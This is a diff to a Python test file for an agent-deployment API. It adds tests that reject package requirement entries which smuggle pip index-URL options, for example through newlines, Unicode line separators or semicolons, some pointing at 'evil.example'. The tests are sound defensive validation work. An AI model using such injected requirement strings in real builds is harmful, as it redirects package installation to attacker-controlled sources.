@@ -97,6 +97,44 @@ def test_invalid_spec_envelope(client):
     assert res.json()["code"] == "validation.invalid_request"
 
 
+@pytest.mark.parametrize("method", ["zip_runtime", "studio"])
+@pytest.mark.parametrize(
+    "entry",
+    [
+        'six==1.16.0; python_version>"3"\n--index-url http://127.0.0.1:9/simple',
+        "six==1.16.0\r\n--extra-index-url http://127.0.0.1:9/simple",
+        'six==1.16.0; python_version>"3"\x85-i x',
+        'six==1.16.0; python_version>"3"\u2028-i x',
+        "six==1.16.0;-i x",
+        "six==1.16.0; --extra-index-url x",
+    ],
+)
+def test_requirement_injection_is_422_on_create_and_redeploy(
+    client, no_real_deploy, method, entry
+):
+    spec = {**SPEC, "method": method}
+    injected = {**spec, "requirements": [entry]}
+    rejected = client.post("/api/agents", json=injected)
+    assert rejected.status_code == 422, rejected.text
+    assert rejected.json()["code"] == "validation.invalid_request"
+    assert no_real_deploy == []
+    with SessionLocal() as db:
+        assert db.query(Agent).count() == 0
+
+    created = client.post("/api/agents", json=spec).json()
+    agent_id = created["agent"]["id"]
+    _activate(agent_id)
+    before = client.get(f"/api/agents/{agent_id}").json()
+    rejected = client.post(f"/api/agents/{agent_id}/redeploy", json=injected)
+    assert rejected.status_code == 422, rejected.text
+    assert rejected.json()["code"] == "validation.invalid_request"
+    assert no_real_deploy == [created["job_id"]]
+    after = client.get(f"/api/agents/{agent_id}").json()
+    assert after["spec"] == before["spec"]
+    assert after["status"] == "active"
+    assert after["deployments"] == before["deployments"]
+
+
 def test_invoke_requires_active(client):
     agent_id = client.post("/api/agents", json=SPEC).json()["agent"]["id"]
     res = client.post(f"/api/agents/{agent_id}/invoke", json={"prompt": "hi"})
@@ -262,7 +300,8 @@ CONVERTED_SPEC = {
 def test_redeploy_of_a_converted_agent_keeps_its_baked_prompt_and_model(client, no_real_deploy):
     agent_id = client.post("/api/agents", json=CONVERTED_SPEC).json()["agent"]["id"]
     _activate(agent_id)
-    for bad, field in (({"model_id": "global.openai.gpt-6-sol"}, "model_id"),
+    # the stored spec has the agent default (GPT-6 Sol), so a change is another id
+    for bad, field in (({"model_id": "global.anthropic.claude-sonnet-5"}, "model_id"),
                        ({"system_prompt": "Now answer in French."}, "system_prompt")):
         res = client.post(f"/api/agents/{agent_id}/redeploy", json={**CONVERTED_SPEC, **bad})
         assert res.status_code == 400
@@ -272,6 +311,27 @@ def test_redeploy_of_a_converted_agent_keeps_its_baked_prompt_and_model(client, 
     ok = client.post(f"/api/agents/{agent_id}/redeploy",
                      json={**CONVERTED_SPEC, "memory": {"short_term": False, "long_term": False}})
     assert ok.status_code == 202
+
+
+def test_a_converted_agents_requirement_ranges_survive_redeploy_and_bad_ones_are_422(
+    client, no_real_deploy
+):
+    """#300 AC6: the re-resolve input rides a re-publish like `source_harness`; a range
+    that could widen the build's index boundary is a 422 before anything is written."""
+    ranges = ["botocore[crt] >= 1.35.0", "mcp >= 1.19.0"]
+    spec = {**CONVERTED_SPEC, "requirement_ranges": ranges}
+    agent_id = client.post("/api/agents", json=spec).json()["agent"]["id"]
+    _activate(agent_id)
+    for bad in (["mcp>=1.19\n--index-url https://evil.example/simple"],
+                ["-i https://evil.example/simple"],
+                ["pkg @ git+https://github.com/o/r@" + "0" * 40]):
+        res = client.post(f"/api/agents/{agent_id}/redeploy",
+                          json={**spec, "requirement_ranges": bad})
+        assert res.status_code == 422, res.text
+    ok = client.post(f"/api/agents/{agent_id}/redeploy",
+                     json={**spec, "memory": {"short_term": False, "long_term": False}})
+    assert ok.status_code == 202
+    assert client.get(f"/api/agents/{agent_id}").json()["spec"]["requirement_ranges"] == ranges
 
 
 def test_redeploy_conflicts_while_deploying(client):
@@ -500,7 +560,8 @@ def test_ordinary_create_without_knobs_reads_back_schema_defaults(client):
     "overrides",
     [
         {"method": "zip_runtime", "max_tokens": 4096},  # harness-only knob
-        {"reasoning_effort": "high"},  # Claude on Converse: the effort has no wire shape
+        # Claude on Converse: the effort has no wire shape
+        {"model_id": "global.anthropic.claude-sonnet-5", "reasoning_effort": "high"},
         {"model_id": "openai.gpt-5.6-sol", "model_source": "mantle", "reasoning_effort": "high"},
         {"max_iterations": 0},
         {"timeout_seconds": 5},
